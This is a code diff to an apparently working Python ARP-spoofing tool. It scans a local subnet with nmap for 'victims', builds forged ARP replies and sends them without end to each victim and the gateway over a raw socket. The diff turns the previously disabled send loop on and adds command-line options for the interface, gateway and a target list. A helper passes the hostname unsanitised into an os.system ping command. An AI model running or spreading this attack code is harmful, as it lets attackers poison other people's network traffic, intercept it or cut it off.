@@ -2,20 +2,22 @@
 
 import re
 import os
-import sys
 import time
 import nmap3
 import socket
 import threading
+import binascii
+import netifaces
+import argparse
 
 from subprocess import Popen, PIPE
 
 
-subnet = "192.168.1.0/24"  # Subnet your local network
+subnet = "192.168.1.0/24"  # Subnet your local network for scanning
+interfaces = netifaces.interfaces()  # All device interfaces
 
-interface = sys.argv[1]  # Attacker interface
-gateway_ip = sys.argv[2]  # Gateway IP-address
-
+interface = None  # Attacker interface
+gateway_ip = None  # Gateway IP-address
 mac = None  # Attacker MAC-address
 
 victims = []  # List of victims in local network
@@ -29,7 +31,7 @@ class attackThread(threading.Thread):
 		threading.Thread.__init__(self)
 		self.victim = victim
 		self.gateway = gateway
-		self.mac = mac.encode()
+		self.mac = self.encode_mac(mac)
 		self.connect = connect
 
 		# Other
@@ -37,8 +39,8 @@ class attackThread(threading.Thread):
 		self.protocol = b'\x00\x01\x08\x00\x06\x04\x00\x02'  # ARP packet
 
 	def run(self):
-		victim_mac = self.get_mac(self.victim).encode()
-		gateway_mac = self.get_mac(self.gateway).encode()
+		victim_mac = self.get_mac(self.victim)
+		gateway_mac = self.get_mac(self.gateway)
 
 		epacket1 = victim_mac + self.mac + self.arp
 		epacket2 = gateway_mac + self.mac + self.arp
@@ -48,23 +50,29 @@ class attackThread(threading.Thread):
 
 		victim_arp = epacket1 + self.protocol + self.mac + gip + victim_mac + vip
 		gateway_arp = epacket2 + self.protocol + self.mac + vip + gateway_mac + gip
-		print(victim_arp)
-		print(victim_arp.decode())
 
-		while 0:
+		while True:
 			self.connect.send(victim_arp)
-			print(" Packet send to " + self.victim)
+			print("  Packet send to " + self.victim)
 			self.connect.send(gateway_arp)
-			print(" Packet send to " + self.gateway)
 			time.sleep(1)
 
 
 	def get_mac(self, local_ip):
+		self.ping(local_ip)
+
 		pid = Popen(["arp", "-n", local_ip], stdout=PIPE)
 		spid = pid.communicate()[0].decode()
 		local_mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", spid).groups()[0]
 
-		return local_mac
+		return self.encode_mac(local_mac)
+
+	def encode_mac(self, address):
+		return binascii.unhexlify(address.strip().replace(':', ''))
+
+	def ping(self, hostname):
+		response = os.system("ping -c 1 " + hostname + " > /dev/null")
+		return response != 0
 
 
 def attack(ips):
@@ -78,9 +86,16 @@ def attack(ips):
 
 
 def main():
-	global interface, mac, s, victims
+	global interface, mac, s, victims, gateway_ip
+	args = arguments()
 
-	if interface in get_interfaces():
+	interface = args.interface
+	gateway_ip = args.gateway
+
+	if interface == None or gateway_ip == None:
+		raise KeyboardInterrupt
+
+	if interface in interfaces:
 		mac = get_mac(interface)
 		s.bind((interface, socket.htons(0x0800)))
 
@@ -92,15 +107,21 @@ def main():
 	disable_ip_forward()
 
 	try:
-		victims.append(sys.argv[3])
+		if args.target == None:
+			raise IndexError
 
-		nmap = nmap3.NmapHostDiscovery()
-		result = nmap.nmap_no_portscan(sys.argv[3])
+		with open(args.target, 'r') as file:
+			for line in file.readlines():
+				ip = line.strip()
 
-		if len(result["hosts"]) > 0:
-			print("The only victim exposed", sys.argv[3])
-		else:
-			print("Host " + sys.argv[3] + " not found.")
+				if check_ip(ip):
+					victims.append(ip)
+
+				else:
+					print("Invalid IP - " + ip)
+
+		if len(victims) < 1:
+			print("No IPs in your file.")
 			raise KeyboardInterrupt
 
 	except IndexError:
@@ -111,6 +132,15 @@ def main():
 	attack(victims)
 
 
+def arguments():
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-i', '--interface', dest="interface", help="Set a interface")
+	parser.add_argument('-g', '--gateway', dest="gateway", help="Set a gateway")
+	parser.add_argument('-t', '--target', dest="target", help="Set a file with local IPs")
+
+	return parser.parse_args()
+
+
 # Network methods
 
 def disable_ip_forward():
@@ -118,7 +148,7 @@ def disable_ip_forward():
 
 
 def scanner(ip):
-	global victims
+	global victims, interface
 
 	nmap = nmap3.NmapHostDiscovery()
 	victims = nmap.nmap_no_portscan(ip)["hosts"]
@@ -127,7 +157,7 @@ def scanner(ip):
 	print("")
 	for element in victims:
 		addr = element["addr"]
-		if addr != gateway_ip:
+		if addr != gateway_ip and addr != get_local_ip(interface):
 			result.append(addr)
 			print(" -- " + addr)
 
@@ -146,13 +176,22 @@ def scanner(ip):
 
 
 def get_mac(interface):
-    mac_address = open(f"/sys/class/net/{interface}/address").readline()
-    return mac_address
+    iface = netifaces.ifaddresses(interface)[netifaces.AF_LINK]
+    return iface[0]["addr"]
 
 
-def get_interfaces():
-	interfaces = os.listdir("/sys/class/net/")
-	return interfaces
+def get_local_ip(interface):
+    iface = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
+    return iface[0]["addr"]
+
+
+def check_ip(ip):
+	try:
+		socket.inet_aton(ip)
+	except socket.error:
+		return False
+
+	return True
 
 
 if __name__== "__main__":
